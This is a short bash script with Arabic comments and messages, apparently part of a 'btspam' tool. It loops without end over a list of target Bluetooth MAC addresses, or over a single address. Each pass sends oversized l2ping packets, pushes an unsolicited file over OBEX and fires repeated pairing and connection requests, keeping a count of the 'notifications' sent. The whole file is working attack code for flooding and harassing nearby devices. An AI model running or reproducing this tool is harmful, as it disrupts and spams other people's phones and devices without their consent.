#!/bin/bash

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'
COUNTER=0
RUNNING=1

trap 'RUNNING=0' SIGINT SIGTERM

spam_device() {
    local mac="$1"
    local name="$2"
    
    # محاولة إرسال ping
    l2ping -c 1 -s 600 "$mac" > /dev/null 2>&1
    
    # محاولة إرسال ملف عبر OBEX
    echo "BT-SPAM Test" > /tmp/btspam.txt
    obexftp --nopath --noconn --uuid none --bluetooth "$mac" --channel 14 -p /tmp/btspam.txt > /dev/null 2>&1
    
    # محاولة طلب اقتران
    bluetoothctl pair "$mac" > /dev/null 2>&1
    bluetoothctl connect "$mac" > /dev/null 2>&1
    bluetoothctl disconnect "$mac" > /dev/null 2>&1
    
    ((COUNTER++))
}

echo "[*] بدء الإرسال..."
echo ""

if [ "$1" = "all" ]; then
    echo -e "${YELLOW}[*] استهداف جميع الأجهزة${NC}"
    echo ""
    
    while [ $RUNNING -eq 1 ]; do
        while IFS='|' read -r mac name; do
            if [ -n "$mac" ]; then
                spam_device "$mac" "$name"
                echo -e "${GREEN}[$COUNTER]${NC} إرسال إلى: $name ($mac)"
            fi
        done < /root/btspam/targets/devices.txt
        
        sleep 1
    done
elif [ "$1" != "" ]; then
    mac="$1"
    name=$(grep "^$mac|" /root/btspam/targets/devices.txt | cut -d'|' -f2)
    
    echo -e "${YELLOW}[*] استهداف جهاز واحد:${NC} $name ($mac)"
    echo ""
    
    while [ $RUNNING -eq 1 ]; do
        spam_device "$mac" "$name"
        echo -e "${GREEN}[$COUNTER]${NC} إرسال إلى: $name ($mac)"
        sleep 0.5
    done
else
    echo -e "${RED}[!] استخدم: spam.sh all أو spam.sh MAC_ADDRESS${NC}"
    exit 1
fi

echo ""
echo -e "${GREEN}[+] الإرسال توقف${NC}"
echo -e "${YELLOW}[*] إجمالي الإشعارات: $COUNTER${NC}"

# حفظ الإحصائيات
echo "$(date)|$COUNTER|$1" >> /root/btspam/logs/stats.txt
